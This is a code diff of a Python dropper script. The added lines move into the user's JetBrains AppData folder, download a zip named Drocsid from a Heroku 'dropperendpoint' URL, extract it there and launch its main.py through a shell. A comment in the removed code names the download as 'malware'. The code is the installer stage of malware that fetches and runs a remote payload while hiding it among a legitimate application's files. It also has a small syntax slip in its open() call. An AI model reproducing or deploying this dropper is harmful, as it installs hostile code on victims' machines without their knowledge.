@@ -1,23 +1,25 @@
-import requests
 import zipfile
 import os
-import sys
+import subprocess
+import requests
 
 
 def main():
+    current_user = os.getenv("USERNAME")
+    random_path = f"C:/Users/{current_user}/AppData/Local/JetBrains/" # put Drocsid.zip file here :)
+    os.chdir(random_path)
 
-	main_script_path = "Drocsid\src\main.py"
+    resp = requests.get("https://infinite-refuge-85092.herokuapp.com/dropperendpoint")
 
-	#malware = requests.get("download-srouce")
+    with open ("Drocsid.zip" "wb") as zip:
+        zip.write(resp.content)
 
-	with zipfile.ZipFile("Drocsid.zip", 'r') as zip_ref:
-		zip_ref.extractall(".")
+    with zipfile.ZipFile("Drocsid.zip", 'r') as zip_ref:
+        zip_ref.extractall(".")
 
-
-	#os.system(f"{main_script_path}")
-
-	#os.remove("dropper.py")
+    os.chdir("Drocsid\src")
+    subprocess.Popen("main.py", shell=True, stdout=subprocess.PIPE)
 
 
 if __name__ == "__main__":
-	main()
+    main()
